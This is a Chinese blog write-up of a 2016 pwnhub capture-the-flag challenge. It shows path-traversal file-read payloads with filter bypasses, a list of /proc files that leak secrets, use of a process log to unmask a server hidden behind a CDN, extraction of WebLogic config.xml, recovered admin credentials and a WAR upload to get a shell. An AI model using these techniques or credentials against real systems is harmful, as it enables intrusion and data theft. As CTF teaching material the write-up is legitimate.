---
title: pwnhub_找朋友
date: 2016-12-18 23:21:49
tags:
- pwnhub
- weblogic
- lfi
categories:
- Blogs
---


先膜tomato师傅出的题，偷马桶师傅出的题一直都是渗透思路，这点我是服的，顺手膜小m...因为在找真是ip这一步我花了十几个小时都失败了，当时的思路还留在博客里，算是个纪念吧...

<!--more-->

首先下载下来判断文件类型是一个win程序，猜测是类似于木马样式，于是虚拟机打开抓包，发现了请求向`http://shell.pwnme.site`，但是无论通过whois反查还是别的，都没有收获，那么唯一的思路是扫子域名。

于是扫一波域名找到了`http://blog.pwnme.site`,一个python的站，有一些信息：
1、存在登陆注册，user_login和user_register,登陆后从源码里看到了file_download
2、file_download可以读文件，我们找到了`web.py`、`config.py`，然后找到了`models.py`，但是没有找到任何收获。
3、阅读源码发现读文件可以绕过，`filename=templates/../../../../../etc/hosts`,但是没有任何想法，这里猜测有别的站，但是百度云加速过了cdn，我们没办法得到真实ip。
<del>
（1）在没有任何cve和特殊漏洞影响下，我们获取真实ip的唯一办法应该是ssrf，但是我们有能力读文件，那么什么文件会记录请求的ip的。
（2）有个新想法，dns历史解析</del>

这里走了太远的弯路，最开始读文件的时候`/etc/passwd`被过滤了，但是没觉得有什么太大的影响，所以也就没想着绕，阅读得到很多信息，这里有两种绕过方式
```
filename=templates/../../../../../etc/./././passwd
和
filename=templates/../../../../../etc/passwd&filename=config.py
python和php解析参数不一样，不存在什么参数覆盖的影响。
```

得到
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
bl4ck:x:1001:1001:bl4ck,,,:/home/bl4ck:/bin/bash
oracle:x:1002:1002::/u01/oracle:/bin/bash
```
其实有很多信息，首先就是存在bl4ck用户，读这个用户的`.viminfo`和`.bash_history`是很顺手的想法，得到
```
# Jumplist (newest first):
-'  1  27  /tmp/aa.py
-'  2  17  /tmp/aa.py
-'  8  8  ~/blog/web.py
-'  1  0  ~/blog/web.py
-'  2  15  /u0/oraInst.loc
-'  1  0  /u0/oraInst.loc
-'  14  0  ~/weblogic/container-scripts/create-wls-domain.py
-'  1  0  ~/weblogic/container-scripts/create-wls-domain.py
-'  2  15  ~/weblogic/oraInst.loc
-'  1  0  ~/weblogic/oraInst.loc
-'  37  3  ~/blog/web.py
-'  2  15  ~/weblogic/oraInst.loc
```
这里发现除了web意外，还有weblogic，但是我们访问的blog.pwnme.site是过cdn的，那么问题又回到了最关键的部分，怎么得到服务器的真实ip

这里第一种是我上面提到的思路，就是找flask的日志，但是實在是孤陋寡闻了，这里没想到去读系统日志，再加上之前花了大量的时间去pwn题扫配置文件，包括各种proc下的东西，回到web题目的时候已经没想那么多了，当时稍微试了一下`/proc/self/fd/1`就没测试了。

关于proc的东西就不多说了，之前ph师傅发过
```
- /proc/mounts 文件系统列表
- /proc/cpuinfo CPU信息
- /proc/meminfo 内存信息
- /proc/self -> 指向 /proc/[当前进程pid]
- /proc/[pid]/cmdline 进程启动参数（可以获取一些敏感信息，如redis密码等）（可以跨进程，如pid=1的进程/proc/1/cmdline）
- /proc/[pid]/mountinfo 文件系统挂载的信息（可以看到docker文件映射的一些信息，如果是运行在容器内的进程，通常能找到重要数据的路径：如配置文件、代码、数据文件等）
- /proc/[pid]/fd/[fd] 进程打开的文件（fd是文件描述符id）
- /proc/[pid]/exe 指向该进程的可执行文件

更多详情可以参考linux文档 链接：proc(5) - Linux manual page
```
还提到了关于标准输入输出的问题，也就是`/proc/self/fd/1`
```
和docker有关的（但不仅限于docker，比如扩展到supervisord也行得通）。大家知道，文件描述符0是标准输入、1是标准输出、2是标准错误，docker打开的web进程很可能是会将浏览记录和错误记录都输出在1里），甚至包括一些敏感信息（比如启动进程的时候输出一下配置信息什么的）。这时候多读取一下/proc/self/fd/1会有一些不一样的发现。
```

向ph师傅低头学习新姿势...

读`/proc/self/fd/4`得到
```
222.128.2.100 - - [15/Dec/2016:02:41:53 +0000] "GET / HTTP/1.1"  200 2821 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
222.128.2.100 - - [15/Dec/2016:02:41:54 +0000] "GET /static/img/favicon.png HTTP/1.1"  200 - "http://blog.pwnme.site/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
222.128.2.100 - - [15/Dec/2016:02:41:54 +0000] "GET / HTTP/1.1"  200 2821 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
222.128.2.100 - - [15/Dec/2016:02:41:54 +0000] "GET /static/img/favicon.png HTTP/1.1"  200 -
...
HTTP/1.1"  404 1285 "http://54.223.115.219/phpmyadmin/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
```
找到真实ip`http://54.223.115.219`

这里tomato师傅给出了第二种解决办法，也就是我一直研究的获取dns解析历史记录，但我找到很多站都搜索不到，tomato给出了一个别的办法
[https://passivetotal.org](https://passivetotal.org)

![1.png-43.8kB](http://static.zybuluo.com/LoRexxar/2jdv55tovcw7smtqy90anxm0/1.png)
  
  
只能瑟瑟发抖,这个结果我只在who.is和domaintools上搜到了，但都是收费的，没什么办法。


拿到真实ip，开始日weblogic。
[http://54.223.115.219:7001/console](http://54.223.115.219:7001/console)

首先是想办法登陆，这里主要是两篇文章
[http://bobao.360.cn/learning/detail/337.html](http://bobao.360.cn/learning/detail/337.html)

[http://www.cnblogs.com/sevck/p/5729663.html](http://www.cnblogs.com/sevck/p/5729663.html)

首先我们需要找到`SerializedSystemIni.dat`这个文件，那么这里选择先去读启动命令，在`/proc/sched_debug`里面找到
```
 startWebLogic.s 13529    941778.614566         6   120         0.313721         1.292801         1.514692 0 0 /user.slice
 startWebLogic.s 13530    941877.533691        63   120         0.036939         3.371997        41.001105 0 0 /user.slice
```
找到weblogic的进程号，得到
```
/u01/oracle/user_projects/domains/base_domain/bin/startWebLogic.sh
```

然后读配置文件
```
/u01/oracle/user_projects/domains/base_domain/config/config.xml


<?xml version='1.0' encoding='UTF-8'?>
<domain xmlns="http://xmlns.oracle.com/weblogic/domain" xmlns:sec="http://xmlns.oracle.com/weblogic/security" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:wls="http://xmlns.oracle.com/weblogic/security/wls" xsi:schemaLocation="http://xmlns.oracle.com/weblogic/security/wls http://xmlns.oracle.com/weblogic/security/wls/1.0/wls.xsd http://xmlns.oracle.com/weblogic/domain http://xmlns.oracle.com/weblogic/1.0/domain.xsd http://xmlns.oracle.com/weblogic/security/xacml http://xmlns.oracle.com/weblogic/security/xacml/1.0/xacml.xsd http://xmlns.oracle.com/weblogic/security/providers/passwordvalidator http://xmlns.oracle.com/weblogic/security/providers/passwordvalidator/1.0/passwordvalidator.xsd http://xmlns.oracle.com/weblogic/security http://xmlns.oracle.com/weblogic/1.0/security.xsd">
  <name>base_domain</name>
  <domain-version>12.2.1.2.0</domain-version>
  <security-configuration>
    <name>base_domain</name>
    <realm>
      <sec:authentication-provider xsi:type="wls:default-authenticatorType">
        <sec:name>DefaultAuthenticator</sec:name>
      </sec:authentication-provider>
      <sec:authentication-provider xsi:type="wls:default-identity-asserterType">
        <sec:name>DefaultIdentityAsserter</sec:name>
        <sec:active-type>AuthenticatedUser</sec:active-type>
        <sec:active-type>weblogic-jwt-token</sec:active-type>
      </sec:authentication-provider>
      <sec:role-mapper xmlns:xac="http://xmlns.oracle.com/weblogic/security/xacml" xsi:type="xac:xacml-role-mapperType">
        <sec:name>XACMLRoleMapper</sec:name>
      </sec:role-mapper>
      <sec:authorizer xmlns:xac="http://xmlns.oracle.com/weblogic/security/xacml" xsi:type="xac:xacml-authorizerType">
        <sec:name>XACMLAuthorizer</sec:name>
      </sec:authorizer>
      <sec:adjudicator xsi:type="wls:default-adjudicatorType">
        <sec:name>DefaultAdjudicator</sec:name>
      </sec:adjudicator>
      <sec:credential-mapper xsi:type="wls:default-credential-mapperType">
        <sec:name>DefaultCredentialMapper</sec:name>
      </sec:credential-mapper>
      <sec:cert-path-provider xsi:type="wls:web-logic-cert-path-providerType">
        <sec:name>WebLogicCertPathProvider</sec:name>
      </sec:cert-path-provider>
      <sec:cert-path-builder>WebLogicCertPathProvider</sec:cert-path-builder>
      <sec:name>myrealm</sec:name>
      <sec:password-validator xmlns:pas="http://xmlns.oracle.com/weblogic/security/providers/passwordvalidator" xsi:type="pas:system-password-validatorType">
        <sec:name>SystemPasswordValidator</sec:name>
        <pas:min-password-length>8</pas:min-password-length>
        <pas:min-numeric-or-special-characters>1</pas:min-numeric-or-special-characters>
      </sec:password-validator>
    </realm>
    <default-realm>myrealm</default-realm>
    <credential-encrypted>{AES}R/snIxxgRcp1CI5RAFqSfwD4c5tMvE/a63UivPEAj3v+8uf8y0X7OVZQj2wtJyWQDKK3Lz4jCdLrcASoqJ57H6GRBxsHm7wB64XPfploVqSpuBznH3dNWvMIig3I7cIK</credential-encrypted>
    <node-manager-username>weblogic</node-manager-username>
    <node-manager-password-encrypted>{AES}0N0Z2hoc1/b/72xxMrai1uG48m4LA6iIskgeu7ZUWaFbAWWcwoDSZo0RL8ANnCKG</node-manager-password-encrypted>
  </security-configuration>
  <server>
    <name>AdminServer</name>
    <listen-address></listen-address>
  </server>
  <production-mode-enabled>true</production-mode-enabled>
  <embedded-ldap>
    <name>base_domain</name>
    <credential-encrypted>{AES}rcUpHoOEV8A6SSJspFM503PXtD1cOtBt4e3yewh94oA+ptKSL5XTLbIh1lXZygTP</credential-encrypted>
  </embedded-ldap>
  <configuration-version>12.2.1.2.0</configuration-version>
  <app-deployment>
    <name>1</name>
    <target>AdminServer</target>
    <module-type>war</module-type>
    <source-path>servers/AdminServer/upload/1.war/app/1.war</source-path>
    <plan-dir>servers/AdminServer/upload/1.war/plan</plan-dir>
    <plan-path>Plan.xml</plan-path>
    <security-dd-model>DDOnly</security-dd-model>
    <staging-mode xsi:nil="true"></staging-mode>
    <plan-staging-mode xsi:nil="true"></plan-staging-mode>
    <cache-in-app-directory>false</cache-in-app-directory>
  </app-deployment>
  <app-deployment>
    <name>1-1</name>
    <target>AdminServer</target>
    <module-type>war</module-type>
    <source-path>servers/AdminServer/upload/1.war/app/1.war</source-path>
    <plan-dir>servers/AdminServer/upload/1.war/plan</plan-dir>
    <plan-path>Plan.xml</plan-path>
    <security-dd-model>DDOnly</security-dd-model>
    <staging-mode xsi:nil="true"></staging-mode>
    <plan-staging-mode xsi:nil="true"></plan-staging-mode>
    <cache-in-app-directory>false</cache-in-app-directory>
  </app-deployment>
  <app-deployment>
    <name>1-2</name>
    <target>AdminServer</target>
    <module-type>war</module-type>
    <source-path>servers/AdminServer/upload/1.war/app/1.war</source-path>
    <plan-dir>servers/AdminServer/upload/1.war/plan</plan-dir>
    <plan-path>Plan.xml</plan-path>
    <security-dd-model>DDOnly</security-dd-model>
    <staging-mode xsi:nil="true"></staging-mode>
    <plan-staging-mode xsi:nil="true"></plan-staging-mode>
    <cache-in-app-directory>false</cache-in-app-directory>
  </app-deployment>
  <admin-server-name>AdminServer</admin-server-name>
  <resource-group>
    <name>GlobalResourceGroup-0</name>
  </resource-group>
</domain>

```

找到账号密码
```
weblogic/a84cb51a0c33a4db
```

这里思路就是很普通的传war拿shell，启动然后getshell，找到flag在/u01/里，差不多就这样。